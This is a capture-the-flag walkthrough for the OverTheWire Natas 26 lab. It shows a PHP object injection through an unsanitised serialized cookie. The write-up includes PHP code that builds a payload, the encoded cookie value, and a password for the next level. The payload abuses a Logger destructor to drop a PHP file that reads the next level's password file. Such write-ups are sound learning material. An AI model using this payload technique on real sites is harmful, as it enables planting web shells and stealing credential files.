# URL: http://natas26.natas.labs.overthewire.org/

# Solution:

**DISCLAIMER**: Wouldn't figure this out without help from Internet, thanks to all people doing public writeups from which I can learn.

So the website itself is a primitive drawing tool where user can input X and Y coordiantes to draw a line mulitple time on static canvas.
The canvas is 400x300 pixels in dimensions. The drawn lines so far are ketp in `COOKIE` value under: `drawing` key serialized base64 format.  
At the first glance:

```
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
        // img/natas26_COOKIE.png
        // img/natas26_/../../../../../../../../../../../../../../etc/natas_webpass/natas26
        $imgfile="img/natas26_" . session_id() .".png";
        drawImage($imgfile);
        showImage($imgfile);
        storeData();
    }
```

`$imgfile` variable looks like good candidate to attack because it is using `session id` as part of path but it is always adding `.png` extenion so we can't make it access our extension-less `etc/natas_webpass/natas27`  
At that point I noticed the `Logger class` and saw that it is loggining something to `/tmp/` but since that code was not used anywhere in the code + I could not access files at `tmp` I had no idea what to do.  
Looking for hints online, braught me to writeups of other people mentioning that `PHP Object Injection` could be used due to `__destruct` function being a part of `Logger` class.  
OWASP docs:  
https://www.owasp.org/index.php/PHP_Object_Injection

# Solution:

Since the code is using `$drawing=unserialize(base64_decode($_COOKIE["drawing"]));` and not sanitizing the value of `drawing` anyhow, we can use the `PHP Object Injection` on `Logger` class.

Execute following PHP Code to generate payload that you need to place in `drawing` cookie value:

```
<?
    class Logger{
        // we can access img directory so create there PHP file
        private $logFile = "img/darek_shell.php";
        // initMsd does not metter since we will use __destruct and __destruct uses exitMsg
        private $initMsg = "does not metter";
        // PHP Code to inject
        private $exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";

        function __construct($file) {}

        function log($msg){}

        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
    }

    $createdLogger = new Logger("some");
    echo urlencode(base64_encode(serialize($createdLogger)));
?>
```

This will print out:  
`Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxOToiaW1nL2RhcmVrX3NoZWxsLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjE1OiJkb2VzIG5vdC BtZXR0ZXIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MjoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30%3D`  
Now pass this value into `drawing` cookie and send another request and this will crate our PHP file that you can `GET` to execute injected code and therefore get the password.

**Why this works?**  
Because during `unserialize` call on `drawing` cookie value, the `__destruct` method is going to be called on our mocked `Logger` instance.

`Natas 27 password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ`
